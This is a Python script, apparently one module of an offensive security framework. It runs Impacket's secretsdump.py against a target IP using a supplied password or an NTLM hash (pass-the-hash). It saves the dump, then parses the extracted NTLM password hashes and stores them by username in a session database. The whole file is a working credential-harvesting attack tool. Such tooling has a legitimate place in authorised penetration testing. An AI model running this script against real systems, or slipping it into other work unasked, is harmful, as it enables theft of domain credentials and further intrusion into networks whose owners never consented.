#!/usr/bin/env python3
import sys
import os
import argparse
import subprocess
import re

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '../..')))

from core.database import DatabaseManager, Credential
from core.logger import setup_logger, get_logger

logger = None

def parse_secretsdump_output(output, domain, db):
    """Parse secretsdump output and extract credentials."""
    logger.info("Parsing secretsdump output for credentials...")
    
    cred_count = 0
    
    # Parse NTLM hashes: username:rid:lmhash:nthash:::
    for line in output.split('\n'):
        if ':::' in line and not line.startswith('['):
            try:
                parts = line.split(':')
                if len(parts) >= 4:
                    username = parts[0].strip()
                    ntlm_hash = parts[3].strip()
                    
                    if username and ntlm_hash and ntlm_hash != 'aad3b435b51404eeaad3b435b51404ee':
                        logger.info(f"Extracted NTLM hash for {username}")
                        db.add_credential(
                            username=username,
                            domain=domain,
                            ntlm_hash=ntlm_hash,
                            source="secretsdump"
                        )
                        cred_count += 1
            except Exception as e:
                logger.debug(f"Could not parse line: {line} - {e}")
    
    return cred_count

def run_secretsdump(session_dir, target_ip, domain, username, password=None, ntlm_hash=None):
    global logger
    setup_logger("secretsdump", session_dir)
    logger = get_logger("secretsdump")
    
    db_path = os.path.join(session_dir, "session.db")
    db = DatabaseManager(db_path)
    
    logger.info(f"Starting secretsdump against {target_ip}")
    
    # Build credential string
    if password:
        cred_string = f"{domain}/{username}:{password}"
    elif ntlm_hash:
        cred_string = f"{domain}/{username}"
    else:
        logger.error("No password or hash provided")
        return
    
    # secretsdump.py command
    cmd = [
        "secretsdump.py",
        cred_string,
        "-target-ip", target_ip
    ]
    
    if ntlm_hash:
        cmd.extend(["-hashes", f":{ntlm_hash}"])
    
    try:
        logger.info("Running secretsdump.py (this may take a few minutes)...")
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=600  # 10 minute timeout
        )
        
        if result.returncode == 0:
            logger.info("Secretsdump completed successfully")
            
            # Save output
            output_file = os.path.join(session_dir, f"secretsdump_{target_ip}.txt")
            with open(output_file, 'w') as f:
                f.write(result.stdout)
            logger.info(f"Output saved to {output_file}")
            
            # Parse and store credentials
            cred_count = parse_secretsdump_output(result.stdout, domain, db)
            logger.info(f"Extracted {cred_count} credentials from dump")
            
        else:
            logger.error(f"Secretsdump failed: {result.stderr}")
            
    except FileNotFoundError:
        logger.error("secretsdump.py not found. Install Impacket: pip3 install impacket")
    except subprocess.TimeoutExpired:
        logger.error("Secretsdump timed out (>10 min)")
    except Exception as e:
        logger.error(f"Error during secretsdump: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--session-dir", required=True)
    parser.add_argument("--target-ip", required=True)
    parser.add_argument("--domain", required=True)
    parser.add_argument("--username", required=True)
    parser.add_argument("--password")
    parser.add_argument("--ntlm-hash")
    args = parser.parse_args()
    
    run_secretsdump(args.session_dir, args.target_ip, args.domain, 
                   args.username, args.password, args.ntlm_hash)
